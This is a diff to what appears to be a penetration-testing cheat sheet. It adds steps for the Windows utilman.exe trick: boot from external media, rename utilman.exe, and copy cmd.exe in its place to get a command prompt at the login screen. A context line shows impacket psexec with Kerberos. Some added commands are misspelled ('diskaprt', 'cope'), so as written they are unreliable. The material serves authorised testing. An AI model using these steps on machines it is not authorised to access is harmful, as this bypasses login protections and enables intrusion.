@@ -1299,10 +1299,17 @@ python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 <details>
   <summary> Attack modes </summary> 
   
-  ### Insert bootable media, shift F1 for cmd
+  ### Insert bootable media, shift F1 for cmd (If no bitlocker)
+  #### List disks for which to use
   ```cmd
-  pret.py target {ps,pjl,pcl}
+  diskaprt
   ```
+  #### Replace utilman with cmd
+  ```cmd
+  ren utilman.exe utilman.exe.back
+  cope cmd.exe utilman.exe 
+  ```
+  #### Restart PC and open utility in login screen
   
 </details>
 
